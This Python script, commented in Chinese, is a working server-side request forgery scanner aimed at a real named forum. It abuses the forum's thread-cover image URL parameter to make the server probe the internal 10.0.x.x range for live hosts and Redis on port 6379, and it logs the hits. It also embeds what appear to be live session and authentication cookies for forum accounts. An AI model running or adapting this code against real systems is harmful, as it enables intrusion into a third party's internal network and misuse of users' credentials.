# coding:utf-8
"""
	redis 服务探测
	需要调整的地方:
	1. url
	2. cookie
	3. gevent数,太大了服务器受不了,会很多请求超时,就会有很多ip被当做有redis服务
	4. timeout 值, 是网站情况定.
"""

from gevent import monkey
from gevent.pool import Pool
from lib.lib import *
import time
import traceback
import logging
monkey.patch_all()
logpath = "temp/ipalive_"+time.strftime("%Y-%m-%d_%H:%M", time.localtime(time.time())) + ".txt"
logredispath = "temp/redisalive_"+time.strftime("%Y-%m-%d_%H:%M", time.localtime(time.time())) + ".txt"

logging.getLogger().setLevel(logging.ERROR)
import requests
scheme = 'ftp'
port = '65533'
port1= '6379'
ip_block = '10.0'

def run(scheme,ip,port):
		try:
			proxies = {"http": "127.0.0.1:8085"}
			#proxies = {}
			payload = '{scheme}://{ip}:{port}'.format(scheme=scheme, ip=ip, port=port)
			url = "http://lbsbbs.amap.com/forum.php?mod=ajax&action=setthreadcover&inajax=1&fid=2&wysiwyg=1&imgurl={payload}&tid=26815&pid=1".format(
				payload=payload)
			#header = {
			#	"Cookie": "kLeF_2132_lastvisit=1502698831; kLeF_2132_nofavfid=1; kLeF_2132_visitedfid=2; kLeF_2132_lip=127.0.0.1%2C1502711622; kLeF_2132_ulastactivity=4cb4k%2FLxwVR5sTKotZOZD8cPdUdtjMQ0wGLGDdyDOcRfkDdZ2xmt; _ga=GA1.1.1030029695.1502711342; _gid=GA1.1.689776330.1502711342; kLeF_2132_st_t=1%7C1502775302%7C2eeaa2d6a40a44a6f58678e7a0b6a266; kLeF_2132_forum_lastvisit=D_2_1502775302; kLeF_2132_st_p=1%7C1502775308%7Cb344ab0769ca2f8a4bc8e5257417058a; kLeF_2132_viewid=tid_2; kLeF_2132_sid=lZ0w0Q; kLeF_2132_smile=1D1; kLeF_2132_seccode=2.489b501943be3f9c28; kLeF_2132_lastact=1502778393%09forum.php%09ajax; kLeF_2132_connect_is_bind=0; session=2b0f72ee-13bf-4247-b167-ce462b263381; kLeF_2132_auth=92302gYfLsNuPqkEvh6Um4FD0HI8K2RSgmRgBrlJatTB%2BLqShIttK%2FEW7%2BnCNkf7OSX6MLOC2Ihgqqgchhae; kLeF_2132_saltkey=u1eLNQD1"}
			header = {
				"Cookie": "guid=dd6e-dbc8-97d9-dbc0; UM_distinctid=15b47a26880399-0774b79a6b3501-1d386850-13c680-15b47a2688195b; _ga=GA1.2.1142006064.1491555476; Kdw4_5279_saltkey=Gr7Gmig2; Kdw4_5279_lastvisit=1502071963; passport_login=MTE5NTY2ODU4LGFtYXBfMTg1MTg2ODkyMDJDVGEyYjZycmgsYjVjNXZmc2d6bGF2ZjFzYmMzZ2w2bWM1eG5tY3V2NGosMTUwMjA3NTU4OSxZVEJrTXpFd05URmhaalEwTkRRd1l6UTBNVFUxWWprellUZzFZV00wTVRBPQ%3D%3D; tip_cookie=2; Kdw4_5279_editormode_e=-1; Kdw4_5279_visitedfid=57D59; Kdw4_5279_ulastactivity=0826RC7%2FlypaRJnhCSzcZoMC%2BoRaIJyq5492rsBDWVjczMgjrUKb; Kdw4_5279_forum_lastvisit=D_57_1502776441; Kdw4_5279_st_t=66708%7C1502776451%7C00835074f0c8c7569ebb8bd3c8b3c8d3; Kdw4_5279_st_p=66708%7C1502776486%7Cb0e321d1b047d5170205b4aa9494f852; Kdw4_5279_viewid=tid_26815; Kdw4_5279_smile=1D1; caidan=2; Example_auth=aac7a4mJq40AQrnRQTsuttMIgJE1wm49fNCRrZJ7%2FQRRnOYEFmwQBcuLLo27QhNZjPOBsJ1JMvbY4XvS; Kdw4_5279_auth=2ba1Lf4782gfoQD%2FFZz8N7eTGUpOHUIr07AuvO8lMYk8c3c; CNZZDATA1255621002=722874669-1502074181-http%253A%252F%252Flbsbbs.amap.com%252F%7C1502777924; Kdw4_5279_sid=RonirD; Kdw4_5279_lastact=1502787569%09forum.php%09ajax",
				"Referer": "http://lbsbbs.amap.com/login.php?callback=http://lbsbbs.amap.com/forum.php?mod=ajax&action=setthreadcover&inajax=1&fid=2&wysiwyg=1&imgurl=ftp://127.0.0.1:80&tid=26815&pid=1",
				"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
				"Upgrade-Insecure-Requests": "1",
			}
			content = requests.get(url, headers=header, timeout=6, proxies=proxies).content
			print(ip, "ip exists")
			saveFile(ip,logpath)
			try:
				payload = '{scheme}://{ip}:{port}'.format(scheme=scheme, ip=ip, port=port1)
				url = "http://lbsbbs.amap.com/forum.php?mod=ajax&action=setthreadcover&inajax=1&fid=2&wysiwyg=1&imgurl={payload}&tid=26815&pid=1".format(
					payload=payload)
				#header = {
				#	"Cookie": "kLeF_2132_lastvisit=1502698831; kLeF_2132_nofavfid=1; kLeF_2132_visitedfid=2; kLeF_2132_lip=127.0.0.1%2C1502711622; kLeF_2132_ulastactivity=4cb4k%2FLxwVR5sTKotZOZD8cPdUdtjMQ0wGLGDdyDOcRfkDdZ2xmt; _ga=GA1.1.1030029695.1502711342; _gid=GA1.1.689776330.1502711342; kLeF_2132_st_t=1%7C1502775302%7C2eeaa2d6a40a44a6f58678e7a0b6a266; kLeF_2132_forum_lastvisit=D_2_1502775302; kLeF_2132_st_p=1%7C1502775308%7Cb344ab0769ca2f8a4bc8e5257417058a; kLeF_2132_viewid=tid_2; kLeF_2132_sid=lZ0w0Q; kLeF_2132_smile=1D1; kLeF_2132_seccode=2.489b501943be3f9c28; kLeF_2132_lastact=1502778393%09forum.php%09ajax; kLeF_2132_connect_is_bind=0; session=2b0f72ee-13bf-4247-b167-ce462b263381; kLeF_2132_auth=92302gYfLsNuPqkEvh6Um4FD0HI8K2RSgmRgBrlJatTB%2BLqShIttK%2FEW7%2BnCNkf7OSX6MLOC2Ihgqqgchhae; kLeF_2132_saltkey=u1eLNQD1"}
				#header = {
				#	"Cookie": "guid=dd6e-dbc8-97d9-dbc0; UM_distinctid=15b47a26880399-0774b79a6b3501-1d386850-13c680-15b47a2688195b; _ga=GA1.2.1142006064.1491555476; Kdw4_5279_saltkey=Gr7Gmig2; Kdw4_5279_lastvisit=1502071963; passport_login=MTE5NTY2ODU4LGFtYXBfMTg1MTg2ODkyMDJDVGEyYjZycmgsYjVjNXZmc2d6bGF2ZjFzYmMzZ2w2bWM1eG5tY3V2NGosMTUwMjA3NTU4OSxZVEJrTXpFd05URmhaalEwTkRRd1l6UTBNVFUxWWprellUZzFZV00wTVRBPQ%3D%3D; tip_cookie=2; Kdw4_5279_editormode_e=-1; Kdw4_5279_visitedfid=57D59; Kdw4_5279_ulastactivity=0826RC7%2FlypaRJnhCSzcZoMC%2BoRaIJyq5492rsBDWVjczMgjrUKb; Kdw4_5279_forum_lastvisit=D_57_1502776441; Kdw4_5279_st_t=66708%7C1502776451%7C00835074f0c8c7569ebb8bd3c8b3c8d3; Kdw4_5279_st_p=66708%7C1502776486%7Cb0e321d1b047d5170205b4aa9494f852; Kdw4_5279_viewid=tid_26815; Kdw4_5279_smile=1D1; caidan=2; Example_auth=aac7a4mJq40AQrnRQTsuttMIgJE1wm49fNCRrZJ7%2FQRRnOYEFmwQBcuLLo27QhNZjPOBsJ1JMvbY4XvS; Kdw4_5279_auth=2ba1Lf4782gfoQD%2FFZz8N7eTGUpOHUIr07AuvO8lMYk8c3c; CNZZDATA1255621002=722874669-1502074181-http%253A%252F%252Flbsbbs.amap.com%252F%7C1502777924; Kdw4_5279_sid=RonirD; Kdw4_5279_lastact=1502787569%09forum.php%09ajax"
				#}
				content = requests.get(url, headers=header, timeout=6, proxies=proxies).content
			except requests.RequestException as e:
				print(ip," redis exists")
				saveFile(ip,logredispath)
				print(e)
			except Exception as e:
				print("h",e)
		except requests.RequestException:
			pass
		except Exception as e:
			traceback.print_exc()
			#print(e, url)
def check(task):
	ip = task[1]
	port = task[2]
	scheme = task[0]
	run(scheme, ip, port)

"""
	检查结束后
"""
def clean():
	pass
"""
	测试
"""
def test(ip, port):
	check([ip, port])

def main():
	res = []
	for c in xrange(0, 255):
		for d in xrange(1, 255):
			ip = '{0}.{1}.{2}'.format(ip_block, c, d)
			res.insert(0, (scheme,ip,port))
	print("共检查{0}个IP".format(len(res)))
	random.shuffle(res)
	p = Pool(10)
	p.map(check, res)
if __name__ == "__main__":
	print("String...")
	main()
	print("Finished...")
	clean()
